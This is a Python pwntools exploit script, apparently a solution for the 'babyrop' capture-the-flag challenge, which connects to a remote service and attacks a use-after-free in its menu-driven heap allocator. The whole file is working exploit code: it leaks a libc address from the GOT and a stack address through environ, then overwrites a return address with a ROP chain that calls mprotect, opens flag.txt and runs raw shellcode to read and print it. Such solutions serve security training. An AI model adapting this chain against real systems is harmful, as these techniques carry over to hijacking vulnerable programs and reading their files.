from pwn import *

BEDUG = False

libc = ELF('./libc.so.6')
elf = ELF('./babyrop')
if BEDUG==True:
    io = process('./babyrop', env={"LD_PRELOAD": "./libc.so.6"})
else:
    io = remote('mc.ax', 31245)

def C(index, size, data):
    io.recvuntil(b'enter your command: ')
    io.sendline(b'C')
    io.recvuntil(b'enter your index: ')
    io.sendline(str(index).encode('utf-8'))
    io.recvuntil(b'How long is your safe_string: ')
    io.sendline(str(size).encode('utf-8'))
    io.recvuntil(b'enter your string: ')
    io.send(data)

def F(index):
    io.recvuntil(b'enter your command: ')
    io.sendline(b'F')
    io.recvuntil(b'enter your index: ')
    io.sendline(str(index).encode('utf-8'))

def R(index):
    io.recvuntil(b'enter your command: ')
    io.sendline(b'R')
    io.recvuntil(b'enter your index: ')
    io.sendline(str(index).encode('utf-8'))


def W(index, dat):
    io.recvuntil(b'enter your command: ')
    io.sendline(b'W')
    io.recvuntil(b'enter your index: ')
    io.sendline(str(index).encode('utf-8'))
    io.recvuntil(b'enter your string: ')
    io.send(dat)

C(0, 24, b'A')
F(0)
C(1, -1, b'')
C(2, -1, b'')
F(2)
F(1)
C(0, 24, p64(8)+p64(elf.got['puts']))
R(2)
io.recvuntil(b'hex-encoded bytes\n')
a = io.recvline().split()[::-1]
tmp = b''
for i in a:
    tmp += i

libc.address = int(tmp, 16) - libc.sym['puts']
log.info('libc: '+hex(libc.address))
W(0, p64(8)+p64(libc.sym['environ']))
R(2)
io.recvuntil(b'hex-encoded bytes\n')
a = io.recvline().split()[::-1]
tmp = b''
for i in a:
    tmp += i

retaddr = int(tmp, 16) - 0x140
log.info('stack: '+hex(retaddr))
basestack = (retaddr + 0x1be8) - ((retaddr + 0x1be8) % 0x1000) - 0x21000
log.info('base stack: '+hex(basestack))

W(0, p64(0x300)+p64(retaddr))
rop =  p64(libc.address + 0x000000000002d7dd) # pop rdi ; ret
rop += p64(basestack)
rop += p64(libc.address + 0x000000000002eef9) # pop rsi ; ret
rop += p64(0x21000)
rop += p64(libc.address + 0x00000000000d9c2d) # pop rdx ; ret
rop += p64(7)
rop += p64(libc.address + 0x00000000000448a8) # pop rax ; ret
rop += p64(10)
rop += p64(libc.address + 0x00000000000888f2) # syscall ; ret
rop += p64(libc.address + 0x000000000002d7dd) # pop rdi ; ret
rop += p64(retaddr+0x99+0x25)
rop += p64(libc.address + 0x000000000002eef9) # pop rsi ; ret
rop += p64(0)
rop += p64(libc.address + 0x00000000000d9c2d) # pop rdx ; ret
rop += p64(0)
rop += p64(libc.sym['open'])

rop += p64(libc.address + 0x00000000000448a8) # pop rax ; ret
rop += p64(retaddr+0x99)
rop += p64(libc.address + 0x0000000000119227) # mov rsi, rdx ; call rax
rop += b'\x48\x31\xFF\x48\xFF\xC7\x48\xFF\xC7\x48\xFF\xC7\x48\x31\xC0\x48\x8D\x74\x24\x30\x48\x31\xD2\xB2\x60\x0F\x05\x48\x31\xFF\x48\xFF\xC7\x48\x89\xF8\x0F\x05'
rop += b'flag.txt'
rop += p64(0)
W(2, rop)
io.interactive()
